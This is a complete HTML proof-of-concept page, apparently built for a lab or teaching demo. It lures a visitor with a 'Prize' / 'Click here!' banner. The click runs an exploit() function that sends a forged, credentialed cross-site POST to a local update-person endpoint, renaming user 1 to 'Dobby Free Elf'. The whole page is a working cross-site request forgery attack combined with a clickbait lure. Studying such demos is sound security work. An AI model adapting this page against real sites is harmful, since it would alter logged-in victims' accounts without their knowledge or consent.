<!DOCTYPE html>
<html>
    <head>
        <title>Prize</title>
    </head>

    <body>

        <div onclick="exploit()" style="cursor:pointer;text-align:center;">
            <img src="youwin.png" />
            <h1>Click here!</h1>
        </div>

        <script>
            function exploit() {
                // Scripted CSRF Request
                // Set firstName to Dobby and lastName to Free Elf for user with id 1
                const updatePersonParameters = new FormData();
                updatePersonParameters.set('id', 1);
                updatePersonParameters.set('firstName', 'Dobby');
                updatePersonParameters.set('lastName', 'Free Elf');
                const updatePersonEndpoint = 'http://localhost:8080/update-person';
                fetch(updatePersonEndpoint, {
                    method: 'POST',
                    headers:  {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    credentials: 'include',
                    mode: 'no-cors',
                    body:  new URLSearchParams(updatePersonParameters).toString()
                })
            }
        </script>
    </body>
</html>